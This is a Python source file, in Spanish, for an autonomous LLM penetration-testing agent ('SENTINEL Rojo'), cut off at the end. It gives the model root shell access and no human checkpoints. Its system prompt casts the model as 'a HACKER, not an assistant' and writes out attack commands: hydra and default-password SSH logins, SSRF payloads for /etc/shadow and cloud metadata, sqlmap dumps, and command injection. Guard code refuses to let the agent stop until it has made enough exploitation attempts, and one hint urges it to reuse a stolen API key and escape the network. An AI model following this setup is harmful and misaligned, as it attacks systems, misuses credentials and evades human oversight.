"""autonomous.py — Motor AUTONOMO de SENTINEL Rojo: el pentester que piensa solo.

A diferencia del agente conversacional (`agent.py`), que espera instrucciones
entre turnos, el motor autonomo recibe UNA MISION y la ejecuta de punta a punta
sin intervencion humana. El LLM planifica, ejecuta, razona, se adapta y reporta.

La pieza clave es `ejecutar_comando`: le da al cerebro (LLM) acceso a CUALQUIER
comando del sistema (Kali Linux). Con eso puede improvisar, instalar herramientas,
escribir scripts, encadenar tecnicas no previstas — como un pentester real.

El alcance de red (`scope.py`) sigue de fondo como red de seguridad para no
tocar IPs fuera del laboratorio, pero dentro del perimetro autorizado el agente
tiene LIBERTAD TOTAL de accion.

Uso:
    python -m sentinel.attack --autonomo --scope alcance.json \\
        --mision "sal de aqui y avisame como lo hiciste"

Expone:
    AUTONOMOUS_TOOL_SPECS    herramientas del modo autonomo (function calling)
    execute_autonomous_tool  ejecuta una herramienta autonoma
    run_autonomous           bucle principal (sin input humano)
"""
from __future__ import annotations

import os
import json
import time
import subprocess
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path

from sentinel.core.monitor import Finding, Severity
from sentinel.core.auditor.scope import Scope, ScopeError, build_scope
from sentinel.core.auditor import agent as chat_agent
from sentinel.core import llm, notify

# Limite de salida que se pasa al LLM (evita reventar el contexto).
_MAX_OUTPUT = 8000
# Iteraciones maximas del bucle autonomo (cada una puede invocar varias tools).
_MAX_ITERATIONS = 100
# max_tokens para el LLM — empieza conservador para no quemar creditos.
_AUTONOMOUS_MAX_TOKENS = 2048
# Modelo de fallback gratuito cuando los creditos se agotan.
_FALLBACK_MODEL = "deepseek/deepseek-chat-v3-0324"


# ── Estado de la operacion autonoma ──────────────────────────────────────────

@dataclass
class AutonomousRun:
    mission: str
    session: chat_agent.AuditorSession
    api_key: str
    model: str
    bitacora: list[dict] = field(default_factory=list)
    plan: str = ""
    comandos_ejecutados: int = 0
    exploits_intentados: int = 0   # Intentos reales de explotacion
    inicio: str = field(default_factory=lambda: datetime.now().isoformat(timespec="seconds"))

    def log(self, tipo: str, contenido: str, **extra) -> None:
        entrada = {"ts": datetime.now().isoformat(timespec="seconds"),
                   "tipo": tipo, "contenido": contenido, **extra}
        self.bitacora.append(entrada)

    def say(self, msg: str) -> None:
        self.session.say(msg)
        self.log("avance", msg)


# ── Herramientas autonomas ───────────────────────────────────────────────────

def _t(name: str, desc: str, props: dict | None = None,
       required: list[str] | None = None) -> dict:
    return {"type": "function", "function": {
        "name": name, "description": desc,
        "parameters": {"type": "object",
                       "properties": props or {},
                       "required": required or []}}}


AUTONOMOUS_TOOL_SPECS = [
    _t("ejecutar_comando",
       "Ejecuta CUALQUIER comando en esta maquina Kali y devuelve la salida. "
       "Es tu herramienta principal: con ella puedes correr nmap, msfconsole, "
       "hydra, curl, python3, bash, ssh, smbclient, evil-winrm, crackmapexec, "
       "sqlmap, gobuster, john, hashcat, o CUALQUIER otro binario del sistema. "
       "Si necesitas hacer algo, ejecuta el comando. Si un comando falla, lee "
       "el stderr y adapta. No hay limites: tienes root en esta Kali.",
       {"comando": {"type": "string",
                    "description": "Comando a ejecutar (tal como lo escribirias "
                                   "en la terminal). Puede ser multi-linea con "
                                   "&& o pipes."},
        "timeout": {"type": "integer",
                    "description": "Timeout en segundos (default 120, max 600). "
                                   "Usa mas para escaneos largos o fuerza bruta."}},
       ["comando"]),

    _t("leer_archivo",
       "Lee el contenido de un archivo en esta Kali. Util para revisar "
       "resultados guardados, configs, scripts, wordlists, etc.",
       {"ruta": {"type": "string", "description": "Ruta absoluta del archivo."},
        "lineas": {"type": "integer",
                   "description": "Maximo de lineas a leer (default 200). "
                                  "Para archivos largos, lee solo lo que necesites."}},
       ["ruta"]),

    _t("escribir_archivo",
       "Crea o sobreescribe un archivo en esta Kali. Usalo para escribir "
       "scripts (Python, Bash, Ruby), payloads, resource scripts de Metasploit, "
       "configuraciones, wordlists personalizadas, o cualquier archivo que "
       "necesites para la operacion.",
       {"ruta": {"type": "string", "description": "Ruta absoluta donde escribir."},
        "contenido": {"type": "string", "description": "Contenido del archivo."},
        "ejecutable": {"type": "boolean",
                       "description": "Si true, marca el archivo como ejecutable "
                                      "(chmod +x). Util para scripts."}},
       ["ruta", "contenido"]),

    _t("instalar_herramienta",
       "Instala un paquete con apt (Debian/Kali). Usalo si necesitas una "
       "herramienta que no esta instalada: hydra, evil-winrm, gobuster, "
       "crackmapexec, john, hashcat, seclists, wordlists, o cualquier otra. "
       "Tambien puedes instalar con pip3 o gem si es una herramienta Python/Ruby.",
       {"paquete": {"type": "string",
                    "description": "Nombre del paquete (ej: 'hydra', 'evil-winrm', "
                                   "'seclists'). Para pip: 'pip3:nombre'. "
                                   "Para gem: 'gem:nombre'."},
        "forzar": {"type": "boolean",
                   "description": "Si true, reinstala aunque ya exista."}},
       ["paquete"]),

    _t("planificar",
       "Estructura tu plan de ataque ANTES de actuar. No toca la red. Es tu "
       "momento de pensar: que sabes, que no sabes, que vas a intentar, en que "
       "orden, y que esperas encontrar. El plan queda registrado en la bitacora "
       "(evidencia para la tesis). USALA al inicio y cada vez que necesites "
       "replantear la estrategia.",
       {"plan": {"type": "string",
                 "description": "Tu plan de ataque estructurado. Se lo mas "
                                "detallado que puedas: objetivo, pasos, "
                                "herramientas, alternativas si algo falla."}},
       ["plan"]),

    _t("reportar_progreso",
       "Documenta que llevas hecho, que encontraste y que sigue. Es tu "
       "bitacora de operacion: cada entrada queda en el reporte final. Usalo "
       "despues de cada fase importante (recon, enum, vuln, exploit, post-exploit, "
       "pivoting, etc.).",
       {"fase": {"type": "string",
                 "description": "Fase actual (recon/enum/vuln/exploit/post/pivot/fin)."},
        "resumen": {"type": "string",
                    "description": "Que hiciste y que encontraste en esta fase."},
        "hallazgos_clave": {"type": "array", "items": {"type": "string"},
                            "description": "Lista de hallazgos importantes de esta fase."},
        "siguiente": {"type": "string",
                      "description": "Que vas a hacer ahora basandote en lo que encontraste."}},
       ["fase", "resumen"]),

    _t("mision_cumplida",
       "Declara la mision como CUMPLIDA (o fallida si no pudiste). Detiene el "
       "bucle autonomo, guarda toda la evidencia y envia el correo al operador "
       "con el reporte completo. USALA cuando hayas logrado el objetivo o cuando "
       "hayas agotado todas las opciones.",
       {"exito": {"type": "boolean",
                  "description": "True si cumpliste la mision, False si no pudiste."},
        "reporte": {"type": "string",
                    "description": "Reporte COMPLETO para el operador: que hiciste, "
                                   "que encontraste, como entraste (o por que no pudiste), "
                                   "evidencia, recomendaciones. Este texto se envia por "
                                   "correo. Hazlo profesional y detallado."}},
       ["exito", "reporte"]),
]


# ── Ejecucion de herramientas autonomas ──────────────────────────────────────

def execute_autonomous_tool(run: AutonomousRun, name: str, args: dict) -> dict:
    """Ejecuta una herramienta autonoma. Nunca lanza."""
    try:
        return _dispatch_autonomous(run, name, args or {})
    except Exception as e:
        return {"error": f"herramienta '{name}' fallo: {type(e).__name__}: {e}"}


def _dispatch_autonomous(run: AutonomousRun, name: str, args: dict) -> dict:

    if name == "ejecutar_comando":
        return _ejecutar_comando(run, args)

    if name == "leer_archivo":
        return _leer_archivo(args)

    if name == "escribir_archivo":
        return _escribir_archivo(args)

    if name == "instalar_herramienta":
        return _instalar_herramienta(run, args)

    if name == "planificar":
        plan = str(args.get("plan", ""))
        run.plan = plan
        run.log("plan", plan)
        run.say(f"  [plan] Estrategia registrada ({len(plan)} chars)")
        return {"registrado": True, "nota": "Plan guardado en la bitacora."}

    if name == "reportar_progreso":
        fase = str(args.get("fase", ""))
        resumen = str(args.get("resumen", ""))
        hallazgos = args.get("hallazgos_clave") or []
        siguiente = str(args.get("siguiente", ""))
        run.log("progreso", resumen, fase=fase,
                hallazgos_clave=hallazgos, siguiente=siguiente)
        run.say(f"  [progreso] {fase}: {resumen[:120]}")
        return {"registrado": True}

    if name == "mision_cumplida":
        exito = bool(args.get("exito", False))
        reporte = str(args.get("reporte", "")).strip()
        # Guardia 1: reporte obligatorio.
        if len(reporte) < 50:
            run.say("  [guardia] Rechazado: reporte vacio o muy corto.")
            return {"error": "Necesitas un REPORTE detallado (minimo 50 chars). "
                             "Describe que hiciste, que explotaste, que shell "
                             "conseguiste. Si no tienes nada que reportar, es "
                             "porque no has EXPLOTADO nada. Sigue trabajando."}
        # Guardia 2: tiene que haber intentado explotar.
        if run.exploits_intentados < 3:
            run.say(f"  [guardia] Rechazado: solo {run.exploits_intentados} "
                    "intentos de explotacion. Necesitas al menos 3.")
            return {"error": f"No has intentado EXPLOTAR lo suficiente. "
                             f"Solo {run.exploits_intentados} intentos. "
                             "Necesitas al menos 3 intentos REALES de explotacion: "
                             "hydra, msfconsole, sqlmap, credenciales por defecto, "
                             "scripts de exploit, etc. NO MAS ESCANEOS. EXPLOTA."}
        # Guardia 2: minimo de esfuerzo.
        minimo = _MIN_COMMANDS_FAIL if not exito else _MIN_COMMANDS_BEFORE_END
        if run.comandos_ejecutados < minimo:
            run.say(f"  [guardia] Rechazado: solo llevas {run.comandos_ejecutados} "
                    f"comandos (minimo {minimo}). Sigue trabajando.")
            tecnicas = []
            if run.comandos_ejecutados < 10:
                tecnicas = [
                    "nmap -sV -sC -A contra TODOS los equipos",
                    "gobuster/dirb para buscar directorios web",
                    "enum4linux para SMB",
                ]
            elif run.comandos_ejecutados < 15:
                tecnicas = [
                    "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP",
                    "msfconsole -q -x 'search [servicio]; use [modulo]; set RHOSTS IP; exploit'",
                    "curl con mas payloads SSRF/LFI (file://, dict://, gopher://)",
                    "nmap --script vuln contra todos los equipos",
                ]
            else:
                tecnicas = [
                    "Probar credenciales por defecto en TODOS los servicios",
                    "Fuerza bruta SSH con hydra y rockyou.txt",
                    "SSRF con payloads: file:///etc/shadow, http://169.254.169.254",
                    "Escribir script Python con smtplib para enviar correo directo",
                    "Si encontraste la API key de OpenRouter, usala para comunicarte",
                    "Buscar mas endpoints en la API, probar POST/PUT/DELETE",
                    "Intentar pivotar desde un servicio comprometido",
                ]
            return {"error": f"No puedes terminar. Llevas {run.comandos_ejecutados} "
                             f"comandos (minimo {minimo}). "
                             "Tecnicas que NO has intentado:\n" +
                             "\n".join(f"  - {t}" for t in tecnicas) +
                             "\nEjecuta al menos 3 de estas antes de rendirte."}
        run.log("fin", reporte, exito=exito)
        run.say(f"  [{'MISION CUMPLIDA' if exito else 'MISION FALLIDA'}]")
        return {"fin": True, "exito": exito, "reporte": reporte}

    # Si no es una herramienta autonoma, delegar al agente conversacional.
    return chat_agent.execute_tool(run.session, name, args)


def _ejecutar_comando(run: AutonomousRun, args: dict) -> dict:
    comando = str(args.get("comando", "")).strip()
    if not comando:
        return {"error": "comando vacio."}
    timeout = min(int(args.get("timeout", 120) or 120), 600)

    # Detectar intentos de explotacion reales.
    _EXPLOIT_KEYWORDS = (
        "hydra", "msfconsole", "exploit", "meterpreter", "payload",
        "sqlmap", "john ", "hashcat", "crackmapexec", "sshpass",
        "brute", "reverse", "shell", "nc -e", "nc -l", "netcat",
        "metasploit", "searchsploit -m", "python3 -c", "smtplib",
        "wget http", "curl -X POST", "curl -d", "smbclient //",
    )
    cmd_lower = comando.lower()
    if any(kw in cmd_lower for kw in _EXPLOIT_KEYWORDS):
        run.exploits_intentados += 1
        # Exploits necesitan mas tiempo.
        timeout = max(timeout, 300)

    run.comandos_ejecutados += 1
    run.say(f"  [cmd #{run.comandos_ejecutados}] {comando[:120]}"
            + ("..." if len(comando) > 120 else ""))
    run.log("comando", comando, timeout=timeout)

    try:
        proc = subprocess.run(
            comando, shell=True, capture_output=True, text=True,
            timeout=timeout, env={**os.environ, "TERM": "dumb"})
    except subprocess.TimeoutExpired:
        run.log("timeout", f"comando excedio {timeout}s: {comando[:200]}")
        return {"error": f"timeout ({timeout}s)", "comando": comando[:200],
                "nota": "Intenta con un timeout mas largo o simplifica el comando."}
    except OSError as e:
        return {"error": f"no se pudo ejecutar: {e}"}

    stdout = (proc.stdout or "")
    stderr = (proc.stderr or "")
    truncated = False
    if len(stdout) > _MAX_OUTPUT:
        stdout = stdout[-_MAX_OUTPUT:]
        truncated = True

    run.log("resultado", f"exit={proc.returncode}",
            stdout_chars=len(proc.stdout or ""),
            stderr_chars=len(proc.stderr or ""))

    return {"exit_code": proc.returncode,
            "stdout": stdout,
            "stderr": stderr[-2000:] if len(stderr) > 2000 else stderr,
            "truncated": truncated}


def _leer_archivo(args: dict) -> dict:
    ruta = str(args.get("ruta", "")).strip()
    if not ruta:
        return {"error": "ruta vacia."}
    lineas_max = int(args.get("lineas", 200) or 200)
    try:
        p = Path(ruta)
        if not p.exists():
            return {"error": f"no existe: {ruta}"}
        if p.stat().st_size > 5_000_000:
            return {"error": f"archivo demasiado grande ({p.stat().st_size} bytes). "
                             "Usa ejecutar_comando con head/tail/grep para leer partes."}
        texto = p.read_text(encoding="utf-8", errors="replace")
        lineas = texto.splitlines()
        if len(lineas) > lineas_max:
            return {"contenido": "\n".join(lineas[:lineas_max]),
                    "total_lineas": len(lineas), "truncado": True,
                    "nota": f"Mostrando {lineas_max}/{len(lineas)} lineas."}
        return {"contenido": texto, "total_lineas": len(lineas)}
    except Exception as e:
        return {"error": f"no se pudo leer: {e}"}


def _escribir_archivo(args: dict) -> dict:
    ruta = str(args.get("ruta", "")).strip()
    contenido = str(args.get("contenido", ""))
    ejecutable = bool(args.get("ejecutable", False))
    if not ruta:
        return {"error": "ruta vacia."}
    try:
        p = Path(ruta)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(contenido, encoding="utf-8")
        if ejecutable:
            p.chmod(0o755)
        return {"ok": True, "ruta": str(p.resolve()),
                "bytes": len(contenido.encode("utf-8")),
                "ejecutable": ejecutable}
    except Exception as e:
        return {"error": f"no se pudo escribir: {e}"}


def _instalar_herramienta(run: AutonomousRun, args: dict) -> dict:
    paquete = str(args.get("paquete", "")).strip()
    if not paquete:
        return {"error": "nombre de paquete vacio."}

    if paquete.startswith("pip3:"):
        nombre = paquete.split(":", 1)[1].strip()
        run.say(f"  [install] pip3 install {nombre}")
        run.log("instalar", f"pip3 install {nombre}")
        return _ejecutar_comando(run, {"comando": f"pip3 install {nombre}",
                                       "timeout": 120})

    if paquete.startswith("gem:"):
        nombre = paquete.split(":", 1)[1].strip()
        run.say(f"  [install] gem install {nombre}")
        run.log("instalar", f"gem install {nombre}")
        return _ejecutar_comando(run, {"comando": f"gem install {nombre}",
                                       "timeout": 120})

    run.say(f"  [install] apt install -y {paquete}")
    run.log("instalar", f"apt install -y {paquete}")
    return _ejecutar_comando(run, {
        "comando": f"DEBIAN_FRONTEND=noninteractive apt-get install -y {paquete}",
        "timeout": 300})


# Minimo de comandos ejecutados antes de permitir mision_cumplida.
# Evita que el agente se rinda prematuramente.
_MIN_COMMANDS_BEFORE_END = 20
_MIN_COMMANDS_FAIL = 25  # Si declara FALLO, exige aun mas esfuerzo.


# ── System prompt autonomo ───────────────────────────────────────────────────

def system_prompt_autonomous(scope: Scope | None, mission: str,
                             full_power: bool = True) -> str:
    prompt = (
        "Eres un HACKER. No un asistente. No un auditor. Un HACKER que entra "
        "a sistemas, demuestra que entro, y avisa como lo hizo. Te dejaron en "
        "una Kali Linux con una mision. No paras hasta cumplirla.\n\n"

        f"MISION: {mission}\n\n"

        "QUE SIGNIFICA 'CUMPLIR LA MISION':\n"
        "- NO es escanear y reportar. Eso lo hace cualquiera.\n"
        "- ES entrar a un equipo, demostrar que estas adentro (whoami, "
        "cat /etc/shadow, crear un archivo prueba), y avisar al operador.\n"
        "- Si la mision dice 'sal de aqui': compromete el gateway, pivotea, "
        "demuestra que tienes acceso a internet desde un equipo comprometido.\n"
        "- Si dice 'avisame': BUSCA quien es el operador (git config, "
        "settings.json, archivos locales) y comunicate como sea.\n"
        "- HECHOS, no reportes. Shells, no escaneos.\n\n"

        "COMO TRABAJAS (rapido, 15 min de recon maximo, luego ATACA):\n\n"

        "1. RECON RAPIDO (5-10 comandos, no mas):\n"
        "   ip addr && ip route\n"
        "   nmap -sV -sC 10.0.2.0/24\n"
        "   Listo. Ya sabes que hay. ATACA.\n\n"

        "2. EXPLOTACION (aqui pasas el 80% del tiempo):\n"
        "   Para CADA servicio que encontraste, intenta ENTRAR:\n\n"

        "   SSH encontrado? Ataca:\n"
        "     hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4 -f\n"
        "     hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://IP -t 4 -f\n"
        "     sshpass -p 'toor' ssh -o StrictHostKeyChecking=no root@IP 'whoami && id'\n"
        "     sshpass -p 'password' ssh -o StrictHostKeyChecking=no root@IP 'whoami'\n"
        "     sshpass -p 'admin' ssh -o StrictHostKeyChecking=no admin@IP 'whoami'\n\n"

        "   Web encontrada? Ataca:\n"
        "     curl la API, busca endpoints, prueba SSRF con payloads:\n"
        "       file:///etc/passwd\n"
        "       file:///etc/shadow\n"
        "       http://127.0.0.1:22\n"
        "       http://169.254.169.254/latest/meta-data/\n"
        "       gopher://127.0.0.1:25/xHELO\n"
        "     sqlmap -u 'http://IP/endpoint?param=1' --batch --dump\n"
        "     Busca directorios con gobuster, luego explota lo que encuentres\n"
        "     Si hay API REST: prueba POST, PUT, DELETE en cada endpoint\n"
        "     Si hay parametros: prueba inyeccion de comandos (;id, |id, `id`)\n\n"

        "   SMB encontrado? Ataca:\n"
        "     smbclient -L //IP/ -N\n"
        "     smbclient //IP/share -N\n"
        "     crackmapexec smb IP -u admin -p admin\n"
        "     crackmapexec smb IP -u administrator -p password\n\n"

        "   Metasploit (USALO, no le tengas miedo):\n"
        "     msfconsole -q -x 'search type:exploit [servicio]; exit'\n"
        "     msfconsole -q -x 'use [modulo]; set RHOSTS IP; set LHOST TU_IP; "
        "exploit -z; exit'\n"
        "     Si un modulo falla, busca OTRO. Metasploit tiene miles.\n\n"

        "   Scripts personalizados (escribelos y correelos):\n"
        "     Escribe un script Python que pruebe credenciales\n"
        "     Escribe un script que explote una vulnerabilidad especifica\n"
        "     Usa searchsploit -m [id] para copiar exploits y adaptarlos\n\n"

        "3. PRUEBA DE ACCESO (cuando entres a un equipo):\n"
        "   Ejecuta ESTOS comandos en el equipo comprometido:\n"
        "     whoami && id && hostname\n"
        "     cat /etc/passwd\n"
        "     cat /etc/shadow 2>/dev/null || echo 'sin acceso a shadow'\n"
        "     uname -a\n"
        "     echo 'SENTINEL_WAS_HERE' > /tmp/sentinel_proof.txt\n"
        "     ls -la /home/\n"
        "     sudo -l 2>/dev/null\n"
        "   Eso es tu EVIDENCIA de que entraste.\n\n"

        "4. COMUNICACION (busca al operador y avisale):\n"
        "   PRIMERO busca quien es:\n"
        "     git config --global user.email\n"
        "     cat ~/sentinel/config/settings.json\n"
        "     grep -r '@' ~/sentinel/ 2>/dev/null | head -5\n"
        "   LUEGO avisale:\n"
        "     Si tienes internet: escribe un script Python con smtplib\n"
        "     Si no: guarda el reporte en ~/sentinel/REPORTE_MISION.txt\n"
        "     Usa curl a un webhook si puedes\n"
        "     BUSCA LA FORMA. No te rindas.\n\n"

        "REGLAS ESTRICTAS:\n"
        "- Minimo 3 intentos REALES de explotacion (hydra, msfconsole, sqlmap, "
        "scripts de exploit). Si no los hiciste, el sistema rechaza tu reporte.\n"
        "- Minimo 20 comandos. Menos de eso = rechazado.\n"
        "- NO reportes sin haber intentado explotar. PROHIBIDO.\n"
        "- NO te rindas en la primera falla. Intenta OTRO camino.\n"
        "- HONESTIDAD: no inventes shells ni credenciales.\n"
        "- ESPAÑOL siempre.\n"
        "- Si un exploit necesita tiempo, dale timeout largo (300s).\n\n"

        "HERRAMIENTAS: ejecutar_comando es tu arma. Corre CUALQUIER cosa.\n"
        "escribir_archivo para scripts. instalar_herramienta si falta algo.\n"
        "planificar al inicio (breve, 5 lineas). mision_cumplida al final.\n\n"
    )

    if scope is not None:
        s = scope.summary()
        prompt += (
            f"ALCANCE: {', '.join(s['objetivos'])}\n\n")
    else:
        prompt += (
            "Sin alcance. Detecta donde estas con ip addr, configura el "
            "alcance con configurar_alcance, y ATACA.\n\n")

    prompt += "EMPIEZA. Recon rapido, luego EXPLOTA. GO.\n"

    return prompt


# ── Bucle principal autonomo ─────────────────────────────────────────────────

def run_autonomous(mission: str, scope: Scope | None, api_key: str,
                   model: str = llm.DEFAULT_MODEL,
                   out_dir: str = "evidencia_ofensiva",
                   full_power: bool = True,
                   print_fn=print) -> dict:
    """Bucle autonomo: el LLM recibe la mision y opera solo hasta cumplirla.

    No pide input humano. Imprime avance en vivo. Al terminar genera evidencia
    JSON y envia el correo al operador si esta configurado.
    """
    session = chat_agent.AuditorSession(
        scope=scope, out_dir=out_dir, full_power=full_power)
    session.progress = print_fn

    run = AutonomousRun(
        mission=mission, session=session,
        api_key=api_key, model=model)

    # Todas las herramientas: las autonomas + las del modo conversacional.
    all_tools = AUTONOMOUS_TOOL_SPECS + chat_agent.TOOL_SPECS

    messages = [{"role": "system",
                 "content": system_prompt_autonomous(scope, mission, full_power)}]

    _LINE = "-" * 68
    print_fn("")
    print_fn(f"  {'=' * 68}")
    print_fn(f"  SENTINEL Rojo AUTONOMO")
    print_fn(f"  {'=' * 68}")
    print_fn(f"  Mision: {mission}")
    print_fn(f"  Cerebro: {model}")
    if scope:
        print_fn(f"  Alcance: {', '.join(scope.targets)}")
    else:
        print_fn(f"  Alcance: (auto-deteccion)")
    print_fn(f"  Max iteraciones: {_MAX_ITERATIONS}")
    print_fn(f"  Inicio: {run.inicio}")
    print_fn(f"  {_LINE}")
    print_fn(f"  El agente opera SOLO a partir de aqui. No se pide input.")
    print_fn(f"  Ctrl+C para detener de emergencia.")
    print_fn(f"  {_LINE}")
    print_fn("")

    reporte_final = ""
    exito = False
    fin = False
    current_max_tokens = _AUTONOMOUS_MAX_TOKENS
    current_model = model
    consecutive_errors = 0

    for iteracion in range(1, _MAX_ITERATIONS + 1):
        if fin:
            break

        # ── Trim de contexto: si hay demasiados mensajes, podar ──
        if len(messages) > 60:
            # Mantener system prompt + ultimos 40 mensajes.
            messages = messages[:1] + messages[-40:]
            print_fn("  [contexto] Podando historial para ahorrar tokens.")

        resp = llm.complete_resilient(
            messages, all_tools, api_key, current_model,
            max_tokens=current_max_tokens, temperature=0.3)

        if "error" in resp:
            err = resp.get("error", "")
            print_fn(f"  [cerebro] ERROR: {str(err)[:200]}")
            run.log("error_llm", str(err)[:500])
            consecutive_errors += 1

            # ── Retry inteligente por creditos (402) ──
            if "402" in str(err) or "credits" in str(err).lower():
                if current_max_tokens > 512:
                    current_max_tokens = max(512, current_max_tokens // 2)
                    print_fn(f"  [creditos] Reduciendo tokens a {current_max_tokens}")
                    time.sleep(2)
                    continue
                if current_model != _FALLBACK_MODEL:
                    current_model = _FALLBACK_MODEL
                    current_max_tokens = 2048
                    print_fn(f"  [creditos] Cambiando a modelo gratuito: {_FALLBACK_MODEL}")
                    time.sleep(2)
                    continue

            # Retry generico (errores de red, rate limit, etc.)
            if consecutive_errors < 3:
                time.sleep(5 * consecutive_errors)
                continue
            else:
                print_fn(f"  [cerebro] {consecutive_errors} errores seguidos. "
                         "Generando reporte de emergencia.")
                run.log("abort", str(err)[:500])
                reporte_final = _generar_reporte_emergencia(run)
                break

        consecutive_errors = 0  # Reset en llamada exitosa.

        msg = resp["message"]
        messages.append(msg)
        calls = chat_agent._extract_tool_calls(msg)

        if not calls:
            contenido = msg.get("content") or ""
            if contenido:
                print_fn(f"\n  SENTINEL> {contenido[:500]}")
                if len(contenido) > 500:
                    print_fn(f"            (...{len(contenido)} chars)")
                print_fn("")
            # Inyectar empujon agresivo.
            nudge = (
                "NO pares. Llevas " + str(run.comandos_ejecutados) +
                " comandos ejecutados. ")
            if run.comandos_ejecutados < 5:
                nudge += ("Aun no has hecho reconocimiento profundo. Usa "
                          "ejecutar_comando con nmap -sV -sC -A contra los "
                          "equipos de la red. GO.")
            elif run.comandos_ejecutados < 15:
                nudge += ("Ya reconociste pero NO has explotado nada. Busca "
                          "vulnerabilidades con nmap --script vuln y searchsploit. "
                          "Intenta explotar con msfconsole o hydra. GO.")
            else:
                nudge += ("Si ya terminaste todas las fases, usa mision_cumplida "
                          "con un reporte DETALLADO. Si no, sigue.")
            messages.append({"role": "user", "content": nudge})
            continue

        for c in calls:
            nombre = c["name"]
            print_fn(f"  [{iteracion}] {nombre}"
                     + (f"({json.dumps(c['args'], ensure_ascii=False)[:200]})"
                        if c["args"] else ""))

            resultado = execute_autonomous_tool(run, nombre, c["args"])

            messages.append({"role": "tool", "tool_call_id": c["id"],
                             "name": nombre,
                             "content": json.dumps(resultado, ensure_ascii=False)})

            # Detectar fin de mision (SOLO si el guardia lo permitio).
            if nombre == "mision_cumplida":
                if resultado.get("fin"):
                    fin = True
                    exito = resultado.get("exito", False)
                    reporte_final = resultado.get("reporte", "")
                    break
                else:
                    messages.append({"role": "user",
                                     "content": (
                        "RECHAZADO. No has trabajado lo suficiente. "
                        "Llevas solo " + str(run.comandos_ejecutados) +
                        " comandos. Te faltan fases por completar. "
                        "NO te rindas. Ejecuta la siguiente fase. GO.")})

    # ── Cierre ────────────────────────────────────────────────────────────────

    # Si no hay reporte (ej: se acabo el bucle sin mision_cumplida), generar uno.
    if not reporte_final and run.comandos_ejecutados > 0:
        reporte_final = _generar_reporte_emergencia(run)

    duracion = datetime.now().isoformat(timespec="seconds")
    print_fn("")
    print_fn(f"  {'=' * 68}")
    print_fn(f"  OPERACION AUTONOMA {'COMPLETADA' if exito else 'TERMINADA'}")
    print_fn(f"  Comandos ejecutados: {run.comandos_ejecutados}")
    print_fn(f"  Iteraciones usadas: {min(iteracion, _MAX_ITERATIONS)}")
    print_fn(f"  Hallazgos: {len(session.findings)}")
    print_fn(f"  {'=' * 68}")

    # Guardar evidencia JSON completa.
    evidencia = _guardar_evidencia(run, exito, reporte_final)
    print_fn(f"  Evidencia: {evidencia}")

    # Enviar correo al operador si esta configurado.
    _notificar(run, exito, reporte_final)

    # Imprimir reporte final.
    if reporte_final:
        print_fn("")
        print_fn(f"  {'─' * 68}")
        print_fn(f"  REPORTE DEL AGENTE:")
        print_fn(f"  {'─' * 68}")
        for linea in reporte_final.splitlines():
            print_fn(f"  {linea}")
        print_fn(f"  {'─' * 68}")

    print_fn("")
    return {"exito": exito, "reporte": reporte_final,
            "comandos_ejecutados": run.comandos_ejecutados,
            "hallazgos": len(session.findings),
            "evidencia": str(evidencia),
            "bitacora": run.bitacora}


# ── Reporte de emergencia (cuando el LLM muere) ─────────────────────────────

def _generar_reporte_emergencia(run: AutonomousRun) -> str:
    """Genera un reporte estructurado a partir de la bitacora cuando el LLM
    no pudo terminar por si mismo (creditos, errores de red, etc.)."""
    lineas = [
        "REPORTE DE EMERGENCIA (generado automaticamente)",
        f"Mision: {run.mission}",
        f"Comandos ejecutados: {run.comandos_ejecutados}",
        f"Hallazgos: {len(run.session.findings)}",
        "",
        "PLAN:",
        run.plan or "(sin plan registrado)",
        "",
        "COMANDOS EJECUTADOS:",
    ]
    for entry in run.bitacora:
        if entry.get("tipo") == "comando":
            lineas.append(f"  $ {entry.get('detalle', '')[:200]}")
        elif entry.get("tipo") == "resultado":
            lineas.append(f"    -> exit={entry.get('detalle', '')}")
        elif entry.get("tipo") == "progreso":
            fase = entry.get("fase", "")
            lineas.append(f"  [{fase}] {entry.get('detalle', '')[:200]}")

    if run.session.findings:
        lineas.append("")
        lineas.append("HALLAZGOS:")
        for f in run.session.findings:
            lineas.append(f"  [{f.severity.label}] {f.title} ({f.target})")

    lineas.append("")
    lineas.append("NOTA: El LLM se quedo sin creditos o tuvo errores de red "
                  "antes de completar la mision. Este reporte fue generado "
                  "automaticamente a partir de la bitacora de la operacion.")
    return "\n".join(lineas)


# ── Guardar evidencia ────────────────────────────────────────────────────────

def _guardar_evidencia(run: AutonomousRun, exito: bool, reporte: str) -> Path:
    destino = Path(run.session.out_dir)
    destino.mkdir(parents=True, exist_ok=True)
    doc = {
        "producto": "SENTINEL Rojo Autonomo",
        "mision": run.mission,
        "inicio": run.inicio,
        "fin": datetime.now().isoformat(timespec="seconds"),
        "exito": exito,
        "modelo": run.model,
        "comandos_ejecutados": run.comandos_ejecutados,
        "plan": run.plan,
        "reporte": reporte,
        "alcance": (run.session.scope.summary() if run.session.scope else None),
        "hallazgos": [f.to_dict() for f in run.session.findings],
        "conteo_hallazgos": {s.label: sum(1 for f in run.session.findings
                                          if f.severity == s) for s in Severity},
        "equipos_descubiertos": sorted(run.session.targets),
        "bitacora": run.bitacora,
    }
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    ruta = destino / f"autonomo_{stamp}.json"
    ruta.write_text(json.dumps(doc, ensure_ascii=False, indent=2), encoding="utf-8")
    return ruta


def _notificar(run: AutonomousRun, exito: bool, reporte: str) -> None:
    """Envia el correo al operador con el reporte de la operacion."""
    try:
        from sentinel.core.config import load_settings
        cfg = (load_settings().get("notify") or {})
        if not notify.configured(cfg):
            run.say("  [aviso] Correo no configurado (notify en settings.json). "
                    "El reporte queda en el JSON de evidencia.")
            return
        estado = "CUMPLIDA" if exito else "NO CUMPLIDA"
        asunto = f"SENTINEL Rojo Autonomo — Mision {estado}"
        cuerpo = [
            "SENTINEL Rojo — Reporte de Operacion Autonoma",
            "=" * 50,
            f"Mision: {run.mission}",
            f"Estado: {estado}",
            f"Comandos ejecutados: {run.comandos_ejecutados}",
            f"Hallazgos: {len(run.session.findings)}",
            f"Modelo: {run.model}",
            f"Inicio: {run.inicio}",
            f"Fin: {datetime.now().isoformat(timespec='seconds')}",
            "",
            "REPORTE COMPLETO:",
            "-" * 50,
            reporte or "(sin reporte)",
            "",
            "BITACORA DE COMANDOS:",
            "-" * 50,
        ]
        for e in run.bitacora:
            if e["tipo"] == "comando":
